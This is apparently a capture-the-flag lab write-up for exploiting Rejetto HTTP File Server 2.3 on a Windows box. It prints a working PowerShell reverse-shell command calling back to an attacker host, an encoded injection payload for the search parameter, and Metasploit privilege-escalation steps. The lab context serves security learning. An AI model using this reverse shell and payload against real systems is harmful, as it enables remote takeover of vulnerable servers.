Box: Windows
Level: Easy

| INDEX                             |
| --------------------------------- |
| 1. MsfConsole                     |
| 2. Rejetto HTTPFileServer 2.3 RCE |
| 3. Exploit Modification           |
The Box was vulnerable with https://www.exploit-db.com/exploits/49584.
Initially to capture the flag, I used the msfconsole and local exploit suggester to perform the privilege escalation to the admin user however, I wanted to capture the request that gets me the reverse shell. 

The box present the web interface with a search box for the HTTP File Server 2.3 Vulnerable to RCE.

The exploit from the above link was downloaded on kali and than the following command and payload was encoded to get the reverse shell on the search function.

```
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

encoded_command = base64.b64encode(command.encode("utf-16le")).decode()

payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

encoded_payload = urllib.parse.quote_plus(payload)

#Now send the Encoded payload through Burp Suite to the GET /?search=%00{{.<Encoded_Payload_Here>.}} Also start the nc listener on port 8888. 
```

Following to that, I was able to use the local exploit suggester to use one of the suggested exploit to get the Admin shell.

```
#at this point, just type "meterpreter>sessions -i 1" where 1 is an invalid #session number and you will be back to the msf6> prompt where you can use the #following exploit suggester module and the session remains active. DO Not Use #Exit or Quit. That will kill the session.


use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
Set Sessions 4
Exploit
```

